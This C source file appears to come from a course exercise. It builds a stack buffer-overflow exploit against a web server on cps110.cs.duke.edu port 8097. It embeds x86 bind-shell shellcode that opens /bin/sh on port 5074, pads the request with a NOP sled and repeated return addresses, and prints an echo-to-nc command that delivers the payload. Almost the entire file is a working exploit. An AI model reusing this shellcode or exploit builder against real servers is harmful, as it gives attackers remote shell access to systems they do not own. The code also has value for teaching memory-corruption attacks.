#include <stdio.h>
#include <string.h>
#include <stdlib.h>

typedef unsigned char byte;
const char *prefix = "GET /";

//5074 changed, working!!! 126 B as instcution,
char shellcode[] = "\\x31\\xc0\\x50\\x40\\x89\\xc3\\x50\\x40\\x50\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x31\\xd2\\x52\\x66\\x68\\x13\\xd2\\x43\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x50\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x40\\x89\\x44\\x24\\x04\\x43\\x43\\xb0\\x66\\xcd\\x80\\x83\\xc4\\x0c\\x52\\x52\\x43\\xb0\\x66\\xcd\\x80\\x93\\x89\\xd1\\xb0\\x3f\\xcd\\x80\\x41\\x80\\xf9\\x03\\x75\\xf6\\x31\\xc0\\xb0\\x46\\x31\\xdb\\x31\\xc9\\xcd\\x80\\xeb\\x16\\x5b\\x31\\xc0\\x88\\x43\\x07\\x89\\x5b\\x08\\x89\\x43\\x0c\\xb0\\x0b\\x8d\\x4b\\x08\\x8d\\x53\\x0c\\xcd\\x80\\xe8\\xe5\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x58\\x41\\x41\\x41\\x41\\x42\\x42\\x42\\x42";

char front[] = "GET /";

char very_head[] = "echo -e \"";

char back[] = " HTTP";

char very_back[] = "\" | nc cps110.cs.duke.edu 8097";

char nop[] = "\\x90\\x90\\x90\\x90";// 440 nops (\x90) in the middle

int main(int argc, char *argv[]) {

	if ( argc != 2 ) /* argc should be 2 for correct execution */
	{
		/* We print argv[0] assuming it is the program name */
		printf( "Please give memory address like this: bffeb000\n");
	}
	else if( argc > 2 )
	{
		printf("Too many arguments supplied.\n");
	}
	else{

		char *mem = argv[1];

		if(strlen(argv[1]) != 8){
			printf("Memory address length incorrect.\n");
			return 0;
		}

		char buf[25];
		int i;
		char *ptr = buf;
		for(i=0;i<strlen(mem);i++){
			if(i%2 == 0){
				*ptr = '\\';
				ptr++;
				*ptr = 'x';
				ptr++;
			}

			*ptr = argv[1][i];
			ptr++;
		}
		*ptr = '\0';


		char ret[25];
		char *cur_buf = ptr-4;
		int k = 0;
		char *cur = ret;
		while(k<4){
			*cur = *cur_buf;
			cur++;
			*cur = *(cur_buf+1);
			cur++;
			*cur = *(cur_buf+2);
			cur++;
			*cur = *(cur_buf+3);
			cur++;
			cur_buf-=4;
			k++;
		}
		*cur = '\0';

		//puts (ret);

		char temp[20000];

		strcpy(temp, very_head);
		strcat(temp, front);

//		int num_op = 35;
//		while(num_op > 0){
//			strcat(temp, nop);
//			num_op--;
//		}

		int num_ret = 75;
		while(num_ret > 0){
			strcat(temp, ret);
			num_ret--;
		}
		int num_slid = 110;
		while(num_slid > 0){
			strcat(temp, nop);
			num_slid--;
		}
		strcat(temp, shellcode);
		strcat(temp, back);
		strcat(temp, very_back);

		printf("\n");
		puts (temp);
		//system(temp);

	}



}

